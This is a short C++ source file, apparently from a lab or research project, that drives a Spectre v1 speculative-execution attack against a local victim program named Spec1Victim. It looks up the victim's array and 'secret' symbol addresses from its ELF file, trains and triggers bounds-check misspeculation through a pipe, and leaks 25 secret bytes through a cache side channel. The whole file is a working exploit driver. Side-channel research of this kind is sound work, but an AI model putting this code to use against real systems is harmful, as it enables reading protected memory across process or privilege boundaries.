//
// Created by sage on 1/17/21.
//
#include <stdafx.h>
#include <cacheutils.h>
#include <Spectrev1.h>
#include <DuplexPipe.h>
#include <lilelf.h>

#define _SECRET_LEN 25
#define _BLOCK_LEN 1024
#define _MAX_TRIES 1000

#define VICTIM_BIN "./Spec1Victim"

int main()
{
    auto du_pipes = DuplexPipe(VICTIM_BIN, NULL);
    auto victim = LilElf(VICTIM_BIN);
    auto m_array1_size = victim.get_sym_value<void>(victim.get_sym("_ZL11array1_size"));
    auto m_array1 = victim.get_sym_value<void>(victim.get_sym("_ZL6array1"));
    auto m_array2 = victim.get_sym_value<void>(victim.get_sym("_ZL6array2"));

    auto sym_secret = victim.get_sym("secret");
    auto m_secret = victim.get_sym_value<uint8_t>(sym_secret);

    Spectrev1 s(m_array1,
                m_array2,
                [&](volatile size_t _x){ du_pipes.clear_rx(); flush(m_array1_size); du_pipes.fmt_send("%llu\n", _x); },
                [](size_t _t){return _t%16;},
                _BLOCK_LEN,
                _MAX_TRIES/4,
                13
    );

    uint8_t val;
    du_pipes.receive_str();
    du_pipes.print_rx_buf();

    du_pipes.fmt_send("%llu\n", 1);
    for (size_t i = 0; i < 25; ++i)
    {
//        load(&m_secret[i]);
        s.read_byte(&m_secret[i], &val);
//        printf("%x ", m_secret[i]);
    }
//    printf("\n");
}

